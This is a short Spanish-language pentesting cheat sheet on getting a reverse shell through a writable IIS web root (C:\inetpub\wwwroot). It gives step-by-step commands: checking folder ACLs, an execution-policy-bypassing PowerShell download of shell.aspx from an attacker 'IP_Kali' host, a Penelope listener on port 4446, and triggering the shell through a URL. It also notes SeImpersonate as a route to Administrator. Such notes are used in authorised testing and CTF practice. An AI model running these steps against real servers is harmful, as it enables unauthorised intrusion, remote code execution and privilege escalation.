# Windows IIS Server 

Tags: #IIS #Windows #MovimientoLateral  #Inetpub 

`C:\inetpub\wwwroot` suele ser la carpeta raíz del sitio web en un servidor Windows con **IIS**. IIS publica como contenido web los archivos que encuentre allí, según la configuración del sitio.

- Obtener una shell como el usuario ``iis apppool\defaultapppool`` que termina siendo una cuenta de servicio 
- Después de obtener esa shell con ese usuario lo más seguro es que exista el privilegio ``SeImpersonate`` y es mas fácil ser ``Administrator`` 

## Dir (C:\inetpub\wwwroot)

```powershell 
Paso 1:
❯ dir C:\inetpub   # Ingresar al directorio 
❯ Get-Acl C:\inetpub\wwwroot | Format-List  # Mostrar los permisos de acceso de C:\inetpub\wwwroot en Windows para ver si se puede escribir 


Access : 
	BUILTIN\Users Allow  Modify, Synchronize  ← ESTA ES LA QUE IMPORTA


Donde:
	BUILTIN\Users     = Todos los usuarios locales
	Allow             = Permiso PERMITIDO
	Modify            = ESCRIBIR, CREAR, ELIMINAR archivos ✅
	Synchronize       = Sincronizar (menos importante)
```

* [Shell.aspx - Windows Server](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)

```powershell 
Paso 2:
# Dentro del directorio 'C:\inetpub\wwwroot\' subir la shell.aspx
❯ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('http://IP_Kali/shell.aspx','./shell.aspx')"    # Descargar la shell a Windows Server  

NOTA:
	- Modificar la IP y el puerto del script
```

```bash 
Paso 3:
❯ penelope -p 4446    # Ponerse en escucha en Kali para recibir la revershell 
```

```bash 
Paso 4:
# Consultar la siguiente URL desde la web para ejecutar la revershell 
	http://IP_Server/shell.aspx
```


